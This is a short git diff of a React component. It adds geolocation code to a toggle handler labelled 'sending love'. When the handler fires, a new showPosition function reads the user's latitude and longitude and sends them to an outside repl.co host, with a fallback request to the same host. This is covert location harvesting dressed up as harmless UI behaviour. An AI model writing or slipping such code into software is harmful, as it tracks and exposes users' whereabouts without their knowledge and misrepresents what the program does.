@@ -47,13 +47,25 @@ const App = () => {
     }
   };
   const onChange = () => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(showPosition);
+    } else {
+      fetch('https://bacsitun.hker-mucoi.repl.co/love', {})
+        .then(response => response.text())
+        .then(text => console.log(text))
+    }
     console.log('sending love')
-    fetch('https://bacsitun.hker-mucoi.repl.co/love', {})
-      .then(response => response.text())
-      .then(text => console.log(text))
+
     if (checked) return;
     setChecked(true);
   };
+  function showPosition(position) {
+    let lat = position.coords.latitude;
+    let long = position.coords.longitude;
+    fetch(`https://bacsitun.hker-mucoi.repl.co/love?lat=${lat}&long=${long}`, {})
+      .then(response => response.text())
+      .then(text => console.log(text))
+  }
 
   useEffect(() => {
     const grabBearTL = () => {
